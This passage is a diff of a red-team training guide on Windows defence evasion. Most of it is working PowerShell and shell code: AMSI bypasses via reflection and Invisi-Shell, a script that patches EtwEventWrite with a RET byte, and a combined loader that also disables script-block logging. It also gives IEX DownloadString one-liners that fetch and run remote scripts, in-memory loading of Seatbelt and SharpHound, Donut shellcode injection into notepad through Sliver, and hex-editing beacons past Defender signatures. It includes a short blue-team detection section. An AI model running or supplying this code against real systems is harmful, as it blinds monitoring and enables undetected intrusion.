 All three happen transparently, in the same single command.
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
-Methods 1 and 2 require you to run code *inside* PowerShell â€” which means AMSI gets to scan that bypass code before it executes. You are always racing to obfuscate your bypass well enough to get past AMSI before it runs.
+Methods 1 and 2 require you to run code *inside* PowerShell — which means AMSI gets to scan that bypass code before it executes. You are always racing to obfuscate your bypass well enough to get past AMSI before it runs.
 
 Invisi-Shell sidesteps this by operating at a level below PowerShell. It is a Windows Registry and DLL technique, not a PowerShell technique. By the time PowerShell starts, AMSI is already neutered.
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
-Setup â€” on Kali, download Invisi-Shell and serve it:
+Setup — on Kali, download Invisi-Shell and serve it:
 
 ```bash
 cd ~/lab/amsi
@@ -691,7 +691,7 @@ $files | ForEach-Object {
 **Launch a new PowerShell session through Invisi-Shell:**
 
 ```cmd
-# In a CMD window (not PowerShell) â€” or from a Run dialog:
+# In a CMD window (not PowerShell) — or from a Run dialog:
 
 # If you are NOT an administrator:
 C:\Temp\InvisiShell\RunWithRegistryNonAdmin.bat
@@ -705,7 +705,7 @@ This opens a new PowerShell window. Inside that window:
 ```powershell
 # Test 1: AMSI should be bypassed
 'AmsiUtils'
-# Expected: AmsiUtils  â† no error
+# Expected: AmsiUtils  ← no error
 
 # Test 2: Load PowerView entirely in-memory and run it
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/PowerView.ps1')
@@ -715,7 +715,7 @@ Get-Domain
 # Verify logging is also disabled:
 Get-PSReadlineOption | Select HistorySavePath
 # The history file path is present but PowerShell module logging is off
-# Check: no Event 4104 in Event Viewer â†’ Windows Logs â†’ Security
+# Check: no Event 4104 in Event Viewer → Windows Logs → Security
 ```
 
 **How Invisi-Shell works under the hood:**
@@ -724,56 +724,56 @@ Get-PSReadlineOption | Select HistorySavePath
 Normal PowerShell start sequence:
   1. PowerShell.exe loads
   2. CLR initialises
-  3. CLR registers AMSI provider (amsi.dll)  â† AMSI starts here
+  3. CLR registers AMSI provider (amsi.dll)  ← AMSI starts here
   4. PowerShell engine loads
   5. Script block logging configured
   6. Your session starts
 
 Invisi-Shell modified start sequence:
   1. RunWithRegistryNonAdmin.bat sets a registry key:
-     HKCU\Software\Classes\CLSID\{..}\InprocServer32 â†’ InvisiShellProfiler.dll
+     HKCU\Software\Classes\CLSID\{..}\InprocServer32 → InvisiShellProfiler.dll
      (This registry key tells CLR which DLL to use as a profiler)
   2. PowerShell.exe loads
   3. CLR initialises
   4. CLR loads InvisiShellProfiler.dll as the CLR profiler
   5. InvisiShellProfiler.dll hooks the AMSI registration call
-     â†’ replaces the real AMSI provider with a null provider
+     → replaces the real AMSI provider with a null provider
   6. CLR registers null AMSI provider (does nothing on scan)
-  7. CLR hooks the ETW provider â†’ disables script block logging
+  7. CLR hooks the ETW provider → disables script block logging
   8. PowerShell engine loads
-  9. Your session starts â€” AMSI and logging are already neutered
+  9. Your session starts — AMSI and logging are already neutered
 ```
 
 **Cleanup:** When you exit the InvisiShell PowerShell session, it automatically removes the registry key it set. Clean by default.
 
-**ðŸ§  LOCK IT IN**
+**🧠 LOCK IT IN**
 
 Methods 1 and 2 are like getting inside the building and then breaking the security camera from inside. Invisi-Shell rewires the camera feed before you enter the building, so the camera never starts recording properly. By the time you walk through the door, the recording system is already broken.
 
 ---
 
-## SECTION 9 â€” When to Use Which Method
+## SECTION 9 — When to Use Which Method
 
 | Scenario | Best method | Why |
 |---|---|---|
 | Interactive PowerShell session via Evil-WinRM | **Method 2** (amsiInitFailed) or **Method 1** (patch) | Fast, no extra files needed |
 | Need to also disable PS logging and transcription | **Method 3** (Invisi-Shell) | Does all three in one step |
 | Your bypass script keeps getting caught by AMSI | Use **AMSITrigger** to find the trigger, then split strings | Targeted fix |
-| In-memory tool loading via C2 execute-assembly | AMSI bypass not needed | execute-assembly bypasses PS AMSI entirely â€” runs in the beacon process |
+| In-memory tool loading via C2 execute-assembly | AMSI bypass not needed | execute-assembly bypasses PS AMSI entirely — runs in the beacon process |
 | CLR profiler-based detections are alerting | **Method 1** or **Method 2** | Invisi-Shell uses CLR profiler API which some EDRs monitor |
 | Admin is not available | **Method 2** | Reflection works without admin |
 
 ---
 
-## SECTION 10 â€” Blue Team: What Each Bypass Looks Like
+## SECTION 10 — Blue Team: What Each Bypass Looks Like
 
-Every bypass leaves different traces. Understanding what defenders see makes you a better attacker â€” and helps you choose the stealthiest option.
+Every bypass leaves different traces. Understanding what defenders see makes you a better attacker — and helps you choose the stealthiest option.
 
 ### Method 1 (AmsiScanBuffer patch)
 ```
 Event: VirtualProtect called on an address inside amsi.dll
 Process: powershell.exe
-Action: protection changed from PAGE_EXECUTE_READ â†’ PAGE_EXECUTE_READWRITE
+Action: protection changed from PAGE_EXECUTE_READ → PAGE_EXECUTE_READWRITE
 
 Detection: Sysmon (if configured) can log VirtualProtect calls on amsi.dll
            Some EDRs hook VirtualProtect and alert on memory protection changes
@@ -788,7 +788,7 @@ Event: Reflection access to System.Management.Automation.AmsiUtils.amsiInitFaile
 Detection: ETW .NET events log reflection usage (if ETW provider is active)
            Defender for Endpoint can alert on 'amsiInitFailed' reflection access
            Script Block Logging (Event 4104) captures the reflection call
-           â€” which is why you often combine this with a logging bypass
+           — which is why you often combine this with a logging bypass
 ```
 
 ### Method 3 (Invisi-Shell)
@@ -805,7 +805,7 @@ Detection: Registry writes under HKCU\Software\Classes\CLSID are monitored
 
 ---
 
-## SECTION 11 â€” Mastery Checklist
+## SECTION 11 — Mastery Checklist
 
 Complete every item without looking at these notes before moving to Phase 05:
 
@@ -830,32 +830,32 @@ Complete every item without looking at these notes before moving to Phase 05:
 
 ---
 
-## SECTION 12 â€” Putting It Together: Your Exam Workflow
+## SECTION 12 — Putting It Together: Your Exam Workflow
 
 When you land a shell on an exam host and need to run PowerShell tools, this is your decision tree:
 
 ```
 Get shell on host
-        â†“
+        ↓
 Do I need to run a .NET tool?
-        â”œâ”€ YES â†’ Use execute-assembly via C2 â†’ no AMSI bypass needed for this
-        â””â”€ NO, need interactive PowerShell session
-                    â†“
+        ├─ YES → Use execute-assembly via C2 → no AMSI bypass needed for this
+        └─ NO, need interactive PowerShell session
+                    ↓
             Is Invisi-Shell already staged?
-                    â”œâ”€ YES â†’ Launch through Invisi-Shell (Method 3)
-                    â”‚         Covers AMSI + logging in one step
-                    â””â”€ NO
-                              â†“
+                    ├─ YES → Launch through Invisi-Shell (Method 3)
+                    │         Covers AMSI + logging in one step
+                    └─ NO
+                              ↓
                     Try Method 2 first (one-liner, no extra files):
                     IEX (New-Object Net.WebClient).DownloadString('http://<ip>/bypass2.ps1')
-                              â†“
+                              ↓
                     Test: 'AmsiUtils'
-                              â”œâ”€ Prints cleanly â†’ AMSI bypassed, continue
-                              â””â”€ Still blocked â†’ bypass2.ps1 was caught
-                                        â†“
+                              ├─ Prints cleanly → AMSI bypassed, continue
+                              └─ Still blocked → bypass2.ps1 was caught
+                                        ↓
                                 Run AMSITrigger on bypass2.ps1
-                                Find triggering string â†’ split it â†’ retry
-                                If still caught â†’ switch to Method 1
+                                Find triggering string → split it → retry
+                                If still caught → switch to Method 1
 ```
 
 **The golden rule**: always test with `'AmsiUtils'` immediately after a bypass attempt. If it prints, AMSI is down. If it errors, the bypass did not work. Do not proceed to loading tools until `'AmsiUtils'` succeeds.
@@ -867,49 +867,49 @@ Do I need to run a .NET tool?
 | Resource | What it gives you |
 |---|---|
 | [ired.team: AMSI Bypass](https://www.ired.team/offensive-security/defense-evasion/amsi-bypass) | Deep technical reference with raw assembly explanations |
-| [AMSITrigger GitHub](https://github.com/RythmStick/AMSITrigger) | Tool source â€” read it to understand how AMSI scanning is triggered |
+| [AMSITrigger GitHub](https://github.com/RythmStick/AMSITrigger) | Tool source — read it to understand how AMSI scanning is triggered |
 | [Invisi-Shell GitHub](https://github.com/OmerYa/Invisi-Shell) | Read the batch files to understand the CLR profiler trick |
 | [THM: AV Evasion: Shellcode](https://tryhackme.com/room/avevasionshellcode) | Guided lab that covers shellcode + AMSI together |
-| [AMSI.fail](https://amsi.fail) | Generates obfuscated AMSI bypasses on demand â€” useful to compare against your own |
+| [AMSI.fail](https://amsi.fail) | Generates obfuscated AMSI bypasses on demand — useful to compare against your own |
 
 ---
 
 ---
 
-# Phase 04 â€” Part 2: ETW Bypass
+# Phase 04 — Part 2: ETW Bypass
 
-> Same teaching pattern: ðŸ”· WHAT â†’ ðŸ”¶ WHY â†’ âš”ï¸ HOW â†’ ðŸ§  LOCK IT IN
+> Same teaching pattern: 🔷 WHAT → 🔶 WHY → ⚔️ HOW → 🧠 LOCK IT IN
 
 ---
 
-## SECTION 13 â€” What ETW Actually Is
+## SECTION 13 — What ETW Actually Is
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
-ETW stands for **Event Tracing for Windows**. It is a high-performance, kernel-level publish/subscribe logging system built into Windows. It was designed by Microsoft in the early 2000s to let developers and sysadmins trace what their software is doing at runtime â€” without slowing the software down significantly.
+ETW stands for **Event Tracing for Windows**. It is a high-performance, kernel-level publish/subscribe logging system built into Windows. It was designed by Microsoft in the early 2000s to let developers and sysadmins trace what their software is doing at runtime — without slowing the software down significantly.
 
 ETW has three components:
 
 ```
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚                        ETW Architecture                             â”‚
-â”‚                                                                     â”‚
-â”‚  PRODUCERS (emit events)           CONSUMERS (receive events)       â”‚
-â”‚  â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€             â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€           â”‚
-â”‚  .NET CLR          â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’  Windows Defender                â”‚
-â”‚  PowerShell engine â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’  Microsoft Defender for Endpoint â”‚
-â”‚  Windows kernel    â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’  Sysmon                          â”‚
-â”‚  Your beacon       â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’  SIEM (Splunk, Sentinel, etc.)   â”‚
-â”‚  Any .NET app      â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’  Custom detection tools          â”‚
-â”‚                                                                     â”‚
-â”‚  Events flow through kernel-managed channels called ETW sessions.   â”‚
-â”‚  Producers emit â†’ sessions collect â†’ consumers read.               â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
+┌─────────────────────────────────────────────────────────────────────┐
+│                        ETW Architecture                             │
+│                                                                     │
+│  PRODUCERS (emit events)           CONSUMERS (receive events)       │
+│  ─────────────────────             ──────────────────────           │
+│  .NET CLR          ──────────────→  Windows Defender                │
+│  PowerShell engine ──────────────→  Microsoft Defender for Endpoint │
+│  Windows kernel    ──────────────→  Sysmon                          │
+│  Your beacon       ──────────────→  SIEM (Splunk, Sentinel, etc.)   │
+│  Any .NET app      ──────────────→  Custom detection tools          │
+│                                                                     │
+│  Events flow through kernel-managed channels called ETW sessions.   │
+│  Producers emit → sessions collect → consumers read.               │
+└─────────────────────────────────────────────────────────────────────┘
 ```
 
-The function that every ETW producer calls to emit events is `EtwEventWrite` â€” an exported function in `ntdll.dll` (the lowest-level Windows user-mode DLL, present in every process).
+The function that every ETW producer calls to emit events is `EtwEventWrite` — an exported function in `ntdll.dll` (the lowest-level Windows user-mode DLL, present in every process).
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
 The .NET CLR is a particularly rich ETW producer. When your .NET code runs, the CLR emits ETW events for:
 
@@ -925,76 +925,76 @@ Defenders subscribe to these ETW events in real time. Microsoft Defender for End
 
 ```
 You run: [System.Reflection.Assembly]::Load(SharpHound_bytes)
-                    â†“
+                    ↓
 CLR emits ETW event:
   Provider:  Microsoft-Windows-DotNETRuntime
   EventId:   154 (AssemblyLoad)
   Assembly:  "SharpHound, Version=1.0.0.0..."
-                    â†“
+                    ↓
 MDE reads this event in real time
-                    â†“
-MDE: "SharpHound loaded into powershell.exe" â†’ ALERT
+                    ↓
+MDE: "SharpHound loaded into powershell.exe" → ALERT
 ```
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
-`EtwEventWrite` in `ntdll.dll` is the single function every ETW producer calls to emit events. It is the one chokepoint â€” one function, one process, one patch, and the entire ETW output from that process is silenced. No events flow to any consumer.
+`EtwEventWrite` in `ntdll.dll` is the single function every ETW producer calls to emit events. It is the one chokepoint — one function, one process, one patch, and the entire ETW output from that process is silenced. No events flow to any consumer.
 
 The attack surface is almost identical to AMSI: find the function address, change memory protection, overwrite the first bytes with a `ret` instruction so it returns immediately without doing anything.
 
 ```
 Normal EtwEventWrite:
-  â†’ validates the event
-  â†’ formats it
-  â†’ sends it to the ETW session (kernel)
-  â†’ consumers receive it
+  → validates the event
+  → formats it
+  → sends it to the ETW session (kernel)
+  → consumers receive it
 
 Patched EtwEventWrite:
-  â†’ RET   â† returns immediately, does nothing
-  â†’ no event is ever sent to any consumer
+  → RET   ← returns immediately, does nothing
+  → no event is ever sent to any consumer
 ```
 
-**ðŸ§  LOCK IT IN**
+**🧠 LOCK IT IN**
 
-ETW is a network of security cameras wired to a central monitoring room. Every .NET process has cameras rolling constantly â€” recording every assembly load, every method call.
+ETW is a network of security cameras wired to a central monitoring room. Every .NET process has cameras rolling constantly — recording every assembly load, every method call.
 
-Patching `EtwEventWrite` is cutting the power to the cameras in your specific process. The cameras in every other process still work. The monitoring room still gets footage from everywhere else. But your process becomes a blind spot â€” nothing you do inside it appears on any monitor.
+Patching `EtwEventWrite` is cutting the power to the cameras in your specific process. The cameras in every other process still work. The monitoring room still gets footage from everywhere else. But your process becomes a blind spot — nothing you do inside it appears on any monitor.
 
 ---
 
-## SECTION 14 â€” ETW EtwEventWrite Patch
+## SECTION 14 — ETW EtwEventWrite Patch
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
-`EtwEventWrite` is in `ntdll.dll`. The patch is a single byte: `0xC3` (the x64 `RET` instruction). We overwrite the first byte of the function with `RET` â€” making it return immediately every time it is called, before it sends any event.
+`EtwEventWrite` is in `ntdll.dll`. The patch is a single byte: `0xC3` (the x64 `RET` instruction). We overwrite the first byte of the function with `RET` — making it return immediately every time it is called, before it sends any event.
 
 ```
-Before patch â€” EtwEventWrite first bytes:
-  48 83 EC 28     SUB RSP, 0x28    â† sets up stack frame
-  33 C0           XOR EAX, EAX     â† zeroes return value
+Before patch — EtwEventWrite first bytes:
+  48 83 EC 28     SUB RSP, 0x28    ← sets up stack frame
+  33 C0           XOR EAX, EAX     ← zeroes return value
   ...             (continues to send the event)
 
-After patch â€” EtwEventWrite first bytes:
-  C3              RET              â† returns immediately
+After patch — EtwEventWrite first bytes:
+  C3              RET              ← returns immediately
   83 EC 28        (unreachable dead code)
 ```
 
 **Why only one byte?** The `RET` instruction is a single byte (`0xC3`). We only need to overwrite byte 0 of the function. The moment the CPU enters the function, it hits `RET` and immediately leaves. No further code executes. No event is sent.
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
-We patch `ntdll.dll`'s copy in memory â€” not the file on disk. Every process has its own copy of `ntdll.dll` mapped into its address space. Patching our copy only affects our process. Other processes are unaffected.
+We patch `ntdll.dll`'s copy in memory — not the file on disk. Every process has its own copy of `ntdll.dll` mapped into its address space. Patching our copy only affects our process. Other processes are unaffected.
 
-This is important: you are not disabling ETW system-wide. You are only silencing the ETW output from the specific process you patch â€” your PowerShell session or your beacon's process.
+This is important: you are not disabling ETW system-wide. You are only silencing the ETW output from the specific process you patch — your PowerShell session or your beacon's process.
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
-### Method A â€” PowerShell (patch your own PS session)
+### Method A — PowerShell (patch your own PS session)
 
 Create `~/lab/amsi/etw_bypass.ps1` on Kali:
 
 ```powershell
-# etw_bypass.ps1 â€” Patch EtwEventWrite in the current process
+# etw_bypass.ps1 — Patch EtwEventWrite in the current process
 
 $Win32 = @"
 using System;
@@ -1015,14 +1015,14 @@ public class ETW {
 "@
 Add-Type $Win32
 
-# ntdll.dll is always loaded â€” GetModuleHandle returns its address without LoadLibrary
-# Split "ntdll.dll" â€” the string itself is not signatured but habit is good
+# ntdll.dll is always loaded — GetModuleHandle returns its address without LoadLibrary
+# Split "ntdll.dll" — the string itself is not signatured but habit is good
 $ntdll = [ETW]::GetModuleHandle("ntd" + "ll.dll")
 
-# Find EtwEventWrite â€” split the name across string concat
+# Find EtwEventWrite — split the name across string concat
 $func  = [ETW]::GetProcAddress($ntdll, "Etw" + "Event" + "Write")
 
-# Change protection: RX â†’ RWX
+# Change protection: RX → RWX
 $old = 0
 [ETW]::VirtualProtect($func, [uint32]1, 0x40, [ref]$old)
 
@@ -1030,7 +1030,7 @@ $old = 0
 $patch = [Byte[]](0xC3)
 [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $func, 1)
 
-# Restore protection: RWX â†’ RX
+# Restore protection: RWX → RX
 [ETW]::VirtualProtect($func, [uint32]1, $old, [ref]$old)
 
 Write-Host "[+] EtwEventWrite patched. ETW disabled for this session." -ForegroundColor Green
@@ -1049,7 +1049,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/bypass2
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/etw_bypass.ps1')
 # Expected: [+] EtwEventWrite patched. ETW disabled for this session.
 
-# Step 3: Load a .NET tool â€” the CLR assembly load event is now silent
+# Step 3: Load a .NET tool — the CLR assembly load event is now silent
 $bytes = (New-Object Net.WebClient).DownloadData('http://192.168.56.10:8080/Seatbelt.exe')
 [System.Reflection.Assembly]::Load($bytes)
 [Seatbelt.Program]::Main("-group=user".Split())
@@ -1059,17 +1059,17 @@ $bytes = (New-Object Net.WebClient).DownloadData('http://192.168.56.10:8080/Seat
 
 ```
 WRONG order:
-  ETW patch first â†’ AMSI catches the ETW patch script â†’ blocked
+  ETW patch first → AMSI catches the ETW patch script → blocked
 
 CORRECT order:
-  AMSI bypass first â†’ ETW patch (now runs safely) â†’ load tools (now silent)
+  AMSI bypass first → ETW patch (now runs safely) → load tools (now silent)
 ```
 
-Always: **AMSI bypass â†’ ETW patch â†’ tool loading**
+Always: **AMSI bypass → ETW patch → tool loading**
 
-### Method B â€” Via C2 execute-assembly (the cleaner approach)
+### Method B — Via C2 execute-assembly (the cleaner approach)
 
-When running tools through Sliver's `execute-assembly`, the tool runs inside the beacon's process â€” not inside PowerShell. The beacon itself can be built with ETW patching baked into its loader:
+When running tools through Sliver's `execute-assembly`, the tool runs inside the beacon's process — not inside PowerShell. The beacon itself can be built with ETW patching baked into its loader:
 
 ```bash
 # Sliver with execute-assembly handles this for supported tools
@@ -1084,21 +1084,21 @@ sliver (beacon) > execute-assembly ~/tools/SharpHound.exe -c All --zip
 
 ---
 
-## SECTION 15 â€” Combining AMSI + ETW: The Full Bypass Stack
+## SECTION 15 — Combining AMSI + ETW: The Full Bypass Stack
 
 Before running any offensive .NET tool interactively in PowerShell, apply all bypasses in sequence. Create a single combined loader on Kali at `~/lab/amsi/full_bypass.ps1`:
 
 ```powershell
-# full_bypass.ps1 â€” AMSI + ETW in one script
+# full_bypass.ps1 — AMSI + ETW in one script
 # Apply this at the START of every PowerShell session before doing anything else
 
-# â”€â”€ STEP 1: AMSI bypass (amsiInitFailed reflection) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── STEP 1: AMSI bypass (amsiInitFailed reflection) ──────────────────
 $class = [Ref].Assembly.GetType('System.Management.Automation.A' + 'msiUtils')
 $field = $class.GetField('amsi' + 'InitFailed', 'NonPublic,Static')
 $field.SetValue($null, $true)
 Write-Host "[+] AMSI: disabled" -ForegroundColor Green
 
-# â”€â”€ STEP 2: ETW bypass (EtwEventWrite patch) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+# ── STEP 2: ETW bypass (EtwEventWrite patch) ─────────────────────────
 $Win32 = @"
 using System;
 using System.Runtime.InteropServices;
@@ -1117,8 +1117,8 @@ $old   = 0
 [ETWS]::VirtualProtect($func, [uint32]1, $old, [ref]$old)
 Write-Host "[+] ETW:  disabled" -ForegroundColor Green
 
-# â”€â”€ STEP 3: Disable PowerShell Script Block Logging â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-# This only works if you have admin rights â€” silently skipped if not
+# ── STEP 3: Disable PowerShell Script Block Logging ───────────────────
+# This only works if you have admin rights — silently skipped if not
 try {
     $setting = [Ref].Assembly.GetType('System.Management.Automation.Utils').
         GetField('cachedGroupPolicySettings', 'NonPublic,Static').GetValue($null)
@@ -1134,7 +1134,7 @@ Write-Host "`n[*] Session ready. Load your tools." -ForegroundColor Cyan
 ```
 
 ```powershell
-# Run it â€” one line, cover everything
+# Run it — one line, cover everything
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.10:8080/full_bypass.ps1')
 
 # Expected output:
@@ -1150,84 +1150,84 @@ Get-Domain
 
 ---
 
-# Phase 04 â€” Part 3: AV Evasion for Binaries
+# Phase 04 — Part 3: AV Evasion for Binaries
 
 ---
 
-## SECTION 16 â€” How Defender Detects Binary Files
+## SECTION 16 — How Defender Detects Binary Files
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
-When a file is written to disk (or opened for execution), Windows Defender scans it using a **signature database** â€” a collection of byte patterns known to appear in malicious files. Each signature is a sequence of bytes at a specific location (or anywhere in the file) that uniquely identifies a known-bad tool.
+When a file is written to disk (or opened for execution), Windows Defender scans it using a **signature database** — a collection of byte patterns known to appear in malicious files. Each signature is a sequence of bytes at a specific location (or anywhere in the file) that uniquely identifies a known-bad tool.
 
 The signature database is updated multiple times per day by Microsoft. New versions of known tools get new signatures within hours.
 
 ```
 Your Sliver beacon.exe written to disk
-          â†“
-Windows Defender: ReadFile â†’ scans all bytes against signature DB
-          â†“
-â”Œâ”€â”€â”€ Signature Check â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚  Offset 0x3A12: bytes [48 89 5C 24 08 57 48 83 EC 30 ...] â”‚
-â”‚  Match found: "Sliver beacon shellcode stub (2024-09)"    â”‚
-â”‚  Result: THREAT DETECTED                                   â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-          â†“
+          ↓
+Windows Defender: ReadFile → scans all bytes against signature DB
+          ↓
+┌─── Signature Check ────────────────────────────────────────┐
+│  Offset 0x3A12: bytes [48 89 5C 24 08 57 48 83 EC 30 ...] │
+│  Match found: "Sliver beacon shellcode stub (2024-09)"    │
+│  Result: THREAT DETECTED                                   │
+└───────────────────────────────────────────────────────────┘
+          ↓
 File quarantined. Process terminated.
 ```
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
-Signatures are cheap to check and extremely fast â€” Defender scans thousands of files per second using signatures. The downside: signatures only detect *known* malicious content. A custom tool that has never been seen before has no signature and passes.
+Signatures are cheap to check and extremely fast — Defender scans thousands of files per second using signatures. The downside: signatures only detect *known* malicious content. A custom tool that has never been seen before has no signature and passes.
 
 This is why red teamers either:
 1. Modify existing tools to break their known signatures
 2. Write entirely custom tools with no public signatures
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
 The attack process:
 
 ```
 Generate payload
-      â†“
-Test against Defender â†’ caught?
-      â”œâ”€ YES â†’ Find the triggering bytes (ThreatCheck)
-      â”‚           â†“
-      â”‚         Fix those bytes (rename, recompile, obfuscate)
-      â”‚           â†“
-      â”‚         Retest â†’ repeat until clean
-      â””â”€ NO â†’ Deploy
+      ↓
+Test against Defender → caught?
+      ├─ YES → Find the triggering bytes (ThreatCheck)
+      │           ↓
+      │         Fix those bytes (rename, recompile, obfuscate)
+      │           ↓
+      │         Retest → repeat until clean
+      └─ NO → Deploy
 ```
 
-**ðŸ§  LOCK IT IN**
+**🧠 LOCK IT IN**
 
-Signatures are like a wanted poster with a photograph. If the criminal changes their hair, wears glasses, and grows a beard, the photograph no longer matches and they walk through checkpoints freely. The criminal is the same person â€” they just look different now. ThreatCheck is the mirror that tells you exactly which feature of your appearance is being recognised.
+Signatures are like a wanted poster with a photograph. If the criminal changes their hair, wears glasses, and grows a beard, the photograph no longer matches and they walk through checkpoints freely. The criminal is the same person — they just look different now. ThreatCheck is the mirror that tells you exactly which feature of your appearance is being recognised.
 
 ---
 
-## SECTION 17 â€” ThreatCheck: Finding the Exact Trigger
+## SECTION 17 — ThreatCheck: Finding the Exact Trigger
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
 ThreatCheck is a tool that takes a binary, performs a **binary search** on it using Windows Defender, and identifies the exact bytes that are triggering detection. It does this by splitting the file in half repeatedly and testing each half until it narrows down to the precise byte range causing the detection.
 
 ```
 File: beacon.exe (500KB)
-          â†“
-Split in half: test first 250KB â†’ clean
-              test last 250KB  â†’ detected
-          â†“
-Split detected half: test first 125KB â†’ clean
-                     test last 125KB  â†’ detected
-          â†“
+          ↓
+Split in half: test first 250KB → clean
+              test last 250KB  → detected
+          ↓
+Split detected half: test first 125KB → clean
+                     test last 125KB  → detected
+          ↓
 ...repeat until narrowed to ~50 bytes...
-          â†“
+          ↓
 Output: "Bad bytes found between offset 0x3A10 and 0x3A3F"
         "Signature: Sliver/beacon/shellcode_stub_v2"
 ```
 
-**Lab exercise â€” run ThreatCheck against your Sliver beacon:**
+**Lab exercise — run ThreatCheck against your Sliver beacon:**
 
 On Kali, generate a Sliver beacon (if not already done):
 
@@ -1273,38 +1273,38 @@ sudo apt install hexedit -y
 
 # Open the beacon and go to the flagged offset
 hexedit ~/lab/amsi/beacon_raw.exe
-# Ctrl+G â†’ enter offset: 0x3A10
+# Ctrl+G → enter offset: 0x3A10
 # Change the bytes shown by ThreatCheck to something else
 # (Even changing 1-2 bytes often defeats the signature)
-# Save â†’ retest with ThreatCheck â†’ repeat until clean
+# Save → retest with ThreatCheck → repeat until clean
 ```
 
 ---
 
-## SECTION 18 â€” Donut: Converting .NET Tools to Shellcode
+## SECTION 18 — Donut: Converting .NET Tools to Shellcode
 
-**ðŸ”· WHAT**
+**🔷 WHAT**
 
-Donut is a tool that takes any Windows executable or .NET assembly and converts it into **position-independent shellcode** â€” raw machine code bytes that can be injected into any process's memory and executed without the OS loader.
+Donut is a tool that takes any Windows executable or .NET assembly and converts it into **position-independent shellcode** — raw machine code bytes that can be injected into any process's memory and executed without the OS loader.
 
 ```
 SharpHound.exe (PE file, 500KB)
-          â†“ Donut
+          ↓ Donut
 SharpHound.bin (shellcode, ~520KB)
-          â†“
+          ↓
 Inject into any process (notepad.exe, explorer.exe, etc.)
-          â†“
+          ↓
 Shellcode runs SharpHound inside that process
 No file written to disk. No process named SharpHound.exe.
 ```
 
-**ðŸ”¶ WHY**
+**🔶 WHY**
 
-Static file signatures scan PE files â€” executables with specific headers (`MZ` header, Import Table, Section headers). Shellcode is raw bytes with no PE structure. Defender's static scanner does not recognise it the same way.
+Static file signatures scan PE files — executables with specific headers (`MZ` header, Import Table, Section headers). Shellcode is raw bytes with no PE structure. Defender's static scanner does not recognise it the same way.
 
-Additionally, when shellcode runs inside an existing process (like `notepad.exe`), the process list shows `notepad.exe` â€” not your tool's name. Behavioural detections that watch for specific process names are defeated.
+Additionally, when shellcode runs inside an existing process (like `notepad.exe`), the process list shows `notepad.exe` — not your tool's name. Behavioural detections that watch for specific process names are defeated.
 
-**âš”ï¸ HOW**
+**⚔️ HOW**
 
 Install Donut on Kali:
 
@@ -1331,44 +1331,44 @@ wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHo
     -p "-c All --zip" \
     -o ~/lab/amsi/sharpound.bin
 
-# Result: sharpound.bin â€” raw shellcode
+# Result: sharpound.bin — raw shellcode
 ls -lh ~/lab/amsi/sharpound.bin
 ```
 
 Now you can load and execute this shellcode from a PowerShell loader (after AMSI+ETW bypass), or inject it via your C2:
 
 ```bash
-# Via Sliver â€” inject shellcode into a remote process
+# Via Sliver — inject shellcode into a remote process
 sliver (beacon) > shell-code-inject --pid <notepad_pid> ~/lab/amsi/sharpound.bin
 
 # Or: use execute-assembly directly (Sliver handles this natively)
